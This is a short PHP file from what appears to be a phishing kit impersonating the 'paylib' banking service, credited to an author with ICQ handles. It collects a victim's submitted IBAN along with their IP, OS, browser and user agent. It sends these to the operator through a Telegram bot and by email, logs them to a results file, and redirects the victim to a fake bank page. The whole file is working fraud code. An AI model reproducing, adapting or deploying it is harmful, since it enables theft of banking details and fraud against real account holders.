<?php
session_start();
error_reporting(0);
/*

Author : H3L13M
ICQ : @651198700
ICQ : @651198700

*/

if(isset($_POST['ibanid']) ){
include "../config.php";
include "inc/funcs.php";



$subject = "[paylib] [LOGIN] INFO from $ip";

$mail = $_POST['ibanid'];

$message = "IBAN: $mail\nOS:  ".getOs($_SERVER['HTTP_USER_AGENT'])."\nBrowser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\nIP : $ip\nAgent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);
mail($email,$subject,$message);


$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../instant-banque.php\" />";
}
else{

	echo "<meta http-equiv=\"Refresh\" content=\"0; url=../index.php\" />";
}
?>
